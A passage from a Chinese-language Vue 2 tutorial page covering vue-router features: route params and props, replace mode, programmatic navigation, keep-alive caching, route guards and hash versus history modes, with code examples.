class="hljs-attr">component</span>:<span class="hljs-title class_">News</span><br>&#125;,<br>&#123;<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Message</span>,<br><span class="hljs-attr">children</span>:[<br>&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;xiangqing&#x27;</span>,<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;detail/:id/:title&#x27;</span>, <span class="hljs-comment">// 🔴使用占位符声明接收params参数</span><br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Detail</span><br>&#125;<br>]<br>&#125;<br>]<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>传递参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;!-- 跳转并携带params参数，to的字符串写法 --&gt;<br>&lt;router-link :to=&quot;/home/message/detail/666/你好&quot;&gt;跳转&lt;/router-link&gt;<br><br>&lt;!-- 跳转并携带params参数，to的对象写法 --&gt;<br>&lt;router-link <br>:to=&quot;&#123;<br>name:&#x27;xiangqing&#x27;,<br>params:&#123;<br>    id:666,<br>       title:&#x27;你好&#x27;<br>&#125;<br>&#125;&quot;<br>&gt;跳转&lt;/router-link&gt;<br></code></pre></td></tr></table></figure><blockquote><p>特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！</p></blockquote></li><li><p>接收参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$route.<span class="hljs-property">params</span>.<span class="hljs-property">id</span><br>$route.<span class="hljs-property">params</span>.<span class="hljs-property">title</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="4-7-路由的props配置"><a href="#4-7-路由的props配置" class="headerlink" title="4.7 路由的props配置"></a>4.7 路由的props配置</h2><p>作用：让路由组件更方便的收到参数</p>   <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;xiangqing&#x27;</span>,<br><span class="hljs-attr">path</span>:<span class="hljs-string">&#x27;detail/:id&#x27;</span>,<br><span class="hljs-attr">component</span>:<span class="hljs-title class_">Detail</span>,<br><br><span class="hljs-comment">//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件</span><br><span class="hljs-comment">// props:&#123;a:900&#125;</span><br><br><span class="hljs-comment">//第二种写法：props值为布尔值，为true时，则把路由收到的所有params参数通过props传给Detail组件</span><br><span class="hljs-comment">// props:true</span><br><br><span class="hljs-comment">//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件</span><br><span class="hljs-title function_">props</span>(<span class="hljs-params">$route</span>)&#123; <span class="hljs-comment">// 这里可以使用解构赋值 &#123;query&#125;</span><br><span class="hljs-keyword">return</span> &#123;<br><span class="hljs-attr">id</span>: $route.<span class="hljs-property">query</span>.<span class="hljs-property">id</span>,<br><span class="hljs-attr">title</span>: $route.<span class="hljs-property">query</span>.<span class="hljs-property">title</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>方便在要跳转去的组件里更简便的写法</p></blockquote><p>跳转去组件的具体代码</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>  &lt;ul&gt;<br>      &lt;h1&gt;Detail&lt;/h1&gt;<br>      &lt;li&gt;消息编号：&#123;&#123;id&#125;&#125;&lt;/li&gt;<br>      &lt;li&gt;消息标题：&#123;&#123;title&#125;&#125;&lt;/li&gt;<br>      &lt;li&gt;a:&#123;&#123;a&#125;&#125;&lt;/li&gt;<br>      &lt;li&gt;b:&#123;&#123;b&#125;&#125;&lt;/li&gt;<br>  &lt;/ul&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>    name: &#x27;Detail&#x27;,<br>    props: [&#x27;id&#x27;, &#x27;title&#x27;, &#x27;a&#x27;, &#x27;b&#x27;],<br>    mounted () &#123;<br>        console.log(this.$route);<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br><br>&lt;style&gt;<br><br>&lt;/style&gt;<br><br></code></pre></td></tr></table></figure><h2 id="4-8-lt-router-link-gt-的replace属性"><a href="#4-8-lt-router-link-gt-的replace属性" class="headerlink" title="4.8 &lt;router-link&gt;的replace属性"></a>4.8 <code>&lt;router-link&gt;</code>的replace属性</h2><ol><li><p>作用：控制路由跳转时操作浏览器历史记录的模式</p></li><li><p>浏览器的历史记录有两种写入方式：分别为<code>push</code>和<code>replace</code></p><p><code>push</code>是追加历史记录</p><p><code>replace</code>是替换当前记录。路由跳转时候默认为<code>push</code></p></li><li><p>如何开启<code>replace</code>模式：</p><p><code>&lt;router-link :replace=&quot;true&quot; ...&gt;News&lt;/router-link&gt;</code><br>简写<code>&lt;router-link replace ...&gt;News&lt;/router-link&gt;</code></p></li></ol><h2 id="4-9-编程式路由导航"><a href="#4-9-编程式路由导航" class="headerlink" title="4.9 编程式路由导航"></a>4.9 编程式路由导航</h2><pre><code class="hljs">1. 作用：不借助`&lt;router-link&gt; `实现路由跳转，让路由跳转更加灵活</code></pre><ol start="2"><li><p>this.$router.push({})内传的对象与<code>&lt;router-link&gt;</code>中的<strong>to</strong>相同</p><p>this.$router.replace({})</p><p>this.$router.forward()前进</p></li></ol><p>​      this.$router.back()后退</p><p>​      this.$router.go(n)可前进也可后退，n为正数前进n，为负数后退</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//$router的两个API</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">push</span>(&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;xiangqing&#x27;</span>,<br><span class="hljs-attr">params</span>:&#123;<br><span class="hljs-attr">id</span>:xxx,<br><span class="hljs-attr">title</span>:xxx<br>&#125;<br>&#125;)<br><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">replace</span>(&#123;<br><span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;xiangqing&#x27;</span>,<br><span class="hljs-attr">params</span>:&#123;<br><span class="hljs-attr">id</span>:xxx,<br><span class="hljs-attr">title</span>:xxx<br>&#125;<br>&#125;)<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">forward</span>() <span class="hljs-comment">//前进</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">back</span>() <span class="hljs-comment">//后退</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">$router</span>.<span class="hljs-title function_">go</span>() <span class="hljs-comment">//可前进也可后退</span><br></code></pre></td></tr></table></figure><h2 id="4-10-缓存路由组件"><a href="#4-10-缓存路由组件" class="headerlink" title="4.10 缓存路由组件"></a>4.10 缓存路由组件</h2><pre><code class="hljs">1. 作用：让不展示的路由组件保持挂载，不被销毁。2. 具体编码：</code></pre><p>这个 include 指的是组件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vue">// 缓存一个路由组件<br>&lt;keep-alive include=&quot;News&quot;&gt; // include中写想要缓存的组件名，不写表示全部缓存<br>    &lt;router-view&gt;&lt;/router-view&gt;<br>&lt;/keep-alive&gt;<br><br>// 缓存多个路由组件<br>&lt;keep-alive :include=&quot;[&#x27;News&#x27;,&#x27;Message&#x27;]&quot;&gt; <br>    &lt;router-view&gt;&lt;/router-view&gt;<br>&lt;/keep-alive&gt;<br></code></pre></td></tr></table></figure><h2 id="4-11-两个新的生命周期钩子"><a href="#4-11-两个新的生命周期钩子" class="headerlink" title="4.11 两个新的生命周期钩子"></a>4.11 两个新的生命周期钩子</h2><p>作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。<br>具体名字：</p><ul><li><code>activated</code>路由组件被激活时触发。</li><li><code>deactivated</code>路由组件失活时触发。</li></ul><blockquote><p>这两个生命周期钩子需要配合前面的缓存路由组件使用（没有缓存路由组件不起效果）</p></blockquote><p>src&#x2F;pages&#x2F;News.vue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;ul&gt;<br>        &lt;li :style=&quot;&#123;opacity&#125;&quot;&gt;欢迎学习vue&lt;/li&gt;<br>        &lt;li&gt;news001 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;<br>        &lt;li&gt;news002 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;<br>        &lt;li&gt;news003 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;<br>    &lt;/ul&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>    export default &#123;<br>        name:&#x27;News&#x27;,<br>        data()&#123;<br>            return&#123;<br>                opacity:1<br>            &#125;<br>        &#125;,<br>        activated()&#123;<br>            console.log(&#x27;News组件被激活了&#x27;)<br>            this.timer = setInterval(() =&gt; &#123;<br>                this.opacity -= 0.01<br>                if(this.opacity &lt;= 0) this.opacity = 1<br>            &#125;,16)<br>        &#125;,<br>        deactivated()&#123;<br>            console.log(&#x27;News组件失活了&#x27;)<br>            clearInterval(this.timer)<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="4-12-路由守卫"><a href="#4-12-路由守卫" class="headerlink" title="4.12 路由守卫"></a>4.12 路由守卫</h2><ol><li><p>作用：对路由进行权限控制</p></li><li><p>分类：全局守卫、独享守卫、组件内守卫</p><ol start="3"><li><p>全局守卫:</p><p>meta路由源信息</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 全局前置守卫：初始化时、每次路由切换前执行</span><br>router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to,<span class="hljs-keyword">from</span>,next</span>) =&gt;</span> &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;beforeEach&#x27;</span>,to,<span class="hljs-keyword">from</span>)<br><span class="hljs-keyword">if</span>(to.<span class="hljs-property">meta</span>.<span class="hljs-property">isAuth</span>)&#123; <span class="hljs-comment">// 判断当前路由是否需要进行权限控制</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;school&#x27;</span>) === <span class="hljs-string">&#x27;atguigu&#x27;</span>)&#123; <span class="hljs-comment">// 权限控制的具体规则</span><br><span class="hljs-title function_">next</span>()<span class="hljs-comment">// 放行</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;暂无权限查看&#x27;</span>)<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_">next</span>()<span class="hljs-comment">// 放行</span><br>&#125;<br>&#125;)<br><br><span class="hljs-comment">// 全局后置守卫：初始化时、每次路由切换后执行</span><br>router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to,<span class="hljs-keyword">from</span></span>) =&gt;</span> &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;afterEach&#x27;</span>,to,<span class="hljs-keyword">from</span>)<br><span class="hljs-keyword">if</span>(to.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span>)&#123; <br><span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = to.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span> <span class="hljs-comment">//修改网页的title</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">&#x27;vue_test&#x27;</span><br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 这个文件专门用于创建整个应用的路由器</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">VueRouter</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue-router&#x27;</span><br><span class="hljs-comment">// 引入组件</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">About</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/About.vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/Home.vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Message</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/Message.vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">News</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/News.vue&#x27;</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Detail</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../pages/Detail.vue&#x27;</span><br><span class="hljs-comment">// 创建并暴露一个路由器</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueRouter</span>(&#123;<br>    <span class="hljs-attr">routes</span>: [<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/home&#x27;</span>,<br>            <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span>,<br>            <span class="hljs-attr">meta</span>:&#123;<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;主页&#x27;</span>&#125;,<br>            <span class="hljs-attr">children</span>: [<br>                &#123;<br>                    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;news&#x27;</span>,<br>                    <span class="hljs-attr">component</span>: <span class="hljs-title class_">News</span>,<br>                    <span class="hljs-attr">meta</span>:&#123;<span class="hljs-attr">isAuth</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;新闻&#x27;</span>&#125;<br>                &#125;,<br>                &#123;<br>                    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;message&#x27;</span>,<br>                    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;mess&#x27;</span>,<br>                    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Message</span>,<br>                    <span class="hljs-attr">meta</span>:&#123;<span class="hljs-attr">isAuth</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;消息&#x27;</span>&#125;,<br>                    <span class="hljs-attr">children</span>: [<br>                        &#123;<br>                            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;detail/:id/:title&#x27;</span>,<br>                            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;xiangqing&#x27;</span>,<br>                            <span class="hljs-attr">component</span>: <span class="hljs-title class_">Detail</span>,<br>                            <span class="hljs-attr">meta</span>:&#123;<span class="hljs-attr">isAuth</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;详情&#x27;</span>&#125;,<br>                            <span class="hljs-title function_">props</span>(<span class="hljs-params">$route</span>) &#123;<br>                                <span class="hljs-keyword">return</span> &#123;<br>                                    <span class="hljs-attr">id</span>: $route.<span class="hljs-property">query</span>.<span class="hljs-property">id</span>,<br>                                    <span class="hljs-attr">title</span>:$route.<span class="hljs-property">query</span>.<span class="hljs-property">title</span>,<br><span class="hljs-attr">a</span>: <span class="hljs-number">1</span>,<br><span class="hljs-attr">b</span>: <span class="hljs-string">&#x27;hello&#x27;</span><br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    ]<br>                &#125;<br>            ]<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/about&#x27;</span>,<br>            <span class="hljs-attr">component</span>: <span class="hljs-title class_">About</span>,<br>            <span class="hljs-attr">meta</span>:&#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;关于&#x27;</span> &#125;<br>        &#125;<br>    ]<br>&#125;)<br><br><span class="hljs-comment">// 全局前置路由守卫————初始化的时候被调用、每次路由切换之前被调用</span><br>router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;前置路由守卫&#x27;</span>, to, <span class="hljs-keyword">from</span>);<br>    <span class="hljs-keyword">if</span>(to.<span class="hljs-property">meta</span>.<span class="hljs-property">isAuth</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;school&#x27;</span>) === <span class="hljs-string">&#x27;zhejiang&#x27;</span>) &#123;<br>            <span class="hljs-comment">// 放行</span><br>            <span class="hljs-title function_">next</span>()<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;学校名不对，无权查看&#x27;</span>)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_">next</span>()<br>    &#125;<br>&#125;)<br><br><span class="hljs-comment">// 全局后置路由守卫————初始化的时候被调用、每次路由切换之后被调用</span><br>router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;后置路由守卫&#x27;</span>, to, <span class="hljs-keyword">from</span>)<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = to.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span> || <span class="hljs-string">&#x27;我的系统&#x27;</span><br>&#125;)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router<br><br></code></pre></td></tr></table></figure><ol start="2"><li><p>独享守卫:</p><blockquote><p>就是在 routes 子路由内写守卫</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title function_">beforeEnter</span>(<span class="hljs-params">to,<span class="hljs-keyword">from</span>,next</span>)&#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;beforeEnter&#x27;</span>,to,<span class="hljs-keyword">from</span>)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&#x27;school&#x27;</span>) === <span class="hljs-string">&#x27;atguigu&#x27;</span>)&#123;<br>        <span class="hljs-title function_">next</span>()<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;暂无权限查看&#x27;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124163115876.png" alt="image-20221124163115876"></p></li></ol></li></ol><p>​        </p><ol start="3"><li><p>组件内守卫</p><blockquote><p>在具体组件内写守卫</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//进入守卫：通过路由规则，进入该组件时被调用</span><br>beforeRouteEnter (to, <span class="hljs-keyword">from</span>, next) &#123;<br>&#125;,<br><span class="hljs-comment">//离开守卫：通过路由规则，离开该组件时被调用</span><br>beforeRouteLeave (to, <span class="hljs-keyword">from</span>, next) &#123;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs vue">&lt;template&gt;<br>    &lt;ul&gt;<br>        &lt;li :style=&quot;&#123;opacity&#125;&quot;&gt;欢迎学习vue&lt;/li&gt;<br>        &lt;li&gt;news001 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;<br>        &lt;li&gt;news002 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;<br>        &lt;li&gt;news003 &lt;input type=&quot;text&quot;&gt;&lt;/li&gt;<br>    &lt;/ul&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>    export default &#123;<br>        name: &#x27;News&#x27;,<br>        data() &#123;<br>            return &#123;<br>                opacity: 1<br>            &#125;<br>        &#125;,<br>        activated() &#123;<br>            console.log(&#x27;News组件被激活了&#x27;)<br>            this.timer = setInterval(() =&gt; &#123;<br>                this.opacity -= 0.01<br>                if (this.opacity &lt;= 0) this.opacity = 1<br>            &#125;, 16)<br>        &#125;,<br>        deactivated() &#123;<br>            console.log(&#x27;News组件失活了&#x27;)<br>            clearInterval(this.timer)<br>        &#125;, // 通过路由规则，离开该组件时被调用<br>        beforeRouteEnter(to, from, next) &#123;<br>            console.log(&#x27;beforeRouteEnter&#x27;, to, from)<br>            if (localStorage.getItem(&#x27;school&#x27;) === &#x27;jialidundaxue&#x27;) &#123;<br>                next()<br>            &#125; else &#123;<br>                alert(&#x27;学校名不对，无权限查看！&#x27;)<br>            &#125;<br>        &#125;,<br>        // 通过路由规则，离开该组件时被调用<br>        beforeRouteLeave(to, from, next) &#123;<br>            console.log(&#x27;beforeRouteLeave&#x27;, to, from)<br>            next()<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></li></ol><p>同一组件配置全部守卫的执行顺序</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221119205337798.png" alt="image-20221119205337798"></p><h2 id="4-13-路由器的两种工作模式"><a href="#4-13-路由器的两种工作模式" class="headerlink" title="4.13 路由器的两种工作模式"></a>4.13 路由器的两种工作模式</h2><ol><li><p>对于一个url来说，什么是hash值?</p><p>#及其后面的内容就是hash值。</p></li><li><p>hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。</p></li><li><p>hash模式：</p><ol><li>地址中永远带着#号，不美观 。</li><li>若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。</li><li>兼容性较好。</li></ol></li><li><p>history模式：</p><ol><li><p>地址干净，美观 。</p></li><li><p>兼容性和hash模式相比略差。</p></li><li><p>应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。</p><p>利用<code>node</code> <code>express</code>简单搭建一个服务器，可以使用<code>connect-history-api-fallback</code>解决</p><p>啥正则路径匹配</p></li></ol></li></ol><p></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> router =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueRouter</span>(&#123;<br><span class="hljs-attr">mode</span>:<span class="hljs-string">&#x27;history&#x27;</span>, #默认<br><span class="hljs-attr">routes</span>:[...]<br>&#125;)<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router<br></code></pre></td></tr></table></figure><pre><code class="hljs">1. </code></pre><h1 id="5-Vue-UI-组件库"><a href="#5-Vue-UI-组件库" class="headerlink" title="5.Vue UI 组件库"></a>5.Vue UI 组件库</h1><h2 id="5-1-常用UI组件库"><a href="#5-1-常用UI组件库" class="headerlink" title="5.1 常用UI组件库"></a>5.1 常用UI<strong>组件库</strong></h2><ol><li><p>移动端常用UI组件库</p><p><a href="https://youzan.github.io/vant">Vant</a></p><p><a href="https://didi.github.io/cube-ui">Cube UI</a></p><p><a 